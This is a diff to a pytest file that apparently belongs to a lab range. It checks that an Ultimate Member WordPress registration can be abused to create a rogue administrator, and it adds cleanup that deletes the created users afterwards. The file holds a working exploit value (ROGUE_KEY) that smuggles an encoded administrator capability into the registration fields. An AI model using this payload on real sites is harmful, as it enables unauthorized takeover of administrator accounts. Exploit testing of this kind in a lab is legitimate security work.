@@ -4,8 +4,10 @@ import uuid
 from conftest import TARGET_PUBLIC
 from range import ATTACKER, run
 
+CORP = "corp"
 CORP_DB = "corp-db"
 CORP_HOST = "Host: corp.com"
+BASELINE_ADMINS = {1}
 ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
 NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')
 
@@ -48,16 +50,25 @@ def _submit(nonce, login):
     ]).stdout.strip()
 
 
+def _delete_users(ids):
+    for uid in sorted(ids):
+        run(CORP, ["wp", "--allow-root", "user", "delete", str(uid), "--yes"])
+
+
 def test_the_rogue_admin_registration_commits_a_new_administrator(stack_is_up):
     before = _admin_ids()
     login = f"rogue_{uuid.uuid4().hex[:8]}"
 
-    code = _submit(_register_nonce(), login)
-    assert code == "302", f"registration did not complete, got {code!r}"
+    try:
+        code = _submit(_register_nonce(), login)
+        assert code == "302", f"registration did not complete, got {code!r}"
 
-    after = _admin_ids()
-    created = after - before
-    assert created, "no new administrator was committed by the UM rogue-admin registration"
-    assert all(uid > 1 for uid in created), (
-        f"expected a non-baseline administrator (id > 1), got {sorted(created)}"
-    )
+        after = _admin_ids()
+        created = after - before
+        assert created, "no new administrator was committed by the UM rogue-admin registration"
+        assert all(uid > 1 for uid in created), (
+            f"expected a non-baseline administrator (id > 1), got {sorted(created)}"
+        )
+    finally:
+        _delete_users(_admin_ids() - before)
+        assert _admin_ids() == BASELINE_ADMINS
